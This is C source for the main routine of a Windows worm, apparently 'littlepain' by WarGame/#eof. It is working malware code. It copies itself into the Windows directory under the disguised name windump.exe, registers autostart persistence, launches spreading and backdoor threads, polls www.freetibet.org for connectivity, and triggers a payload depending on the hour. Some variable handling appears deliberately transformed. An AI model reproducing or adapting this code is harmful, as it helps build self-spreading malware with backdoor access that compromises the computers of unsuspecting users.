#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

#pragma optimize("", off)
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char my_path[MAX_PATH], new_path[MAX_PATH];

    // Transformed: DWORD ThreadID;
    volatile DWORD ThreadID_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_ThreadID = (volatile DWORD *)&ThreadID_buf[0];

    WSADATA wsa;
    SYSTEMTIME time;

    CreateMutexA(NULL, FALSE, "__[__ littlepain by [WarGame,#eof] __]__");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ExitProcess(0);
    }

    GetModuleFileNameA(NULL, my_path, MAX_PATH);
    GetWindowsDirectoryA(new_path, MAX_PATH);
    strcat(new_path, "\\windump.exe");
    CopyFileA(my_path, new_path, FALSE);
    _AutoStart((BYTE*)new_path);

    if (WSAStartup(MAKEWORD(1,1), &wsa) != 0)
    {
        return 0;
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_L0cal_4, new_path, 0, &(*p_ThreadID));
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_BackDoor_4, NULL, 0, &(*p_ThreadID));

    while (!gethostbyname("www.freetibet.org"))
    {
        Sleep(1000*60*20);
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extra, new_path, 0, &(*p_ThreadID));

    GetSystemTime(&time);
    if (time.wHour % 2 == 0)
    {
        _Payload();
    }

    Sleep(INFINITE);
    return 0;
}
#pragma optimize("", on)
